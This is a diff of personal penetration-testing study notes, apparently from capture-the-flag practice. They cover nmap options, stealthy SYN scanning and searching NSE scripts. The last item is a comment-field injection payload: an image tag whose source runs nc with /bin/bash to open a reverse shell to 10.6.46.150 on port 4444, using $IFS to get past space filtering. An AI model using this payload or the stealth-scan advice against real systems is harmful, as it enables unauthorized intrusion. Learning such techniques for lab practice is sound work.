@@ -1,17 +1,19 @@
-### -sC flag in nmap runs a set of default NSE scripts, some of them are intrusive so this should not be run against real machines.
+*
+-sC flag in nmap runs a set of default NSE scripts, some of them are intrusive so this should not be run against real machines.
 
-
-### -A flag means agressive. It consists of 
+*
+-A flag means agressive. It consists of 
 -A: Enable OS detection, version detection, script scanning, and traceroute
 
-### nmap run without sudo does TCP scan (-sT) and with sudo SYN scan (-sS). SYYN scan is better as it is a stealth one - sends RST flag to server so it avoids getting detected by firewall (for example). On the other side, it can destabilize weak applications on a server .
+*
+nmap run without sudo does TCP scan (-sT) and with sudo SYN scan (-sS). SYYN scan is better as it is a stealth one - sends RST flag to server so it avoids getting detected by firewall (for example). On the other side, it can destabilize weak applications on a server .
 
-### To check if there is a nse script for X service:
+*
+To check if there is a nse script for X service:
+`grep "X" /usr/share/nmap/scripts/script.db`
 
-#### grep "X" /usr/share/nmap/scripts/script.db
-
-
-#### Getting rev shell when there is a chance to write a comment
+*
+Getting rev shell when there is a chance to write a comment
 <img src=http://10.6.46.150/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.6.46.150 '$IFS'4444')>
 
  
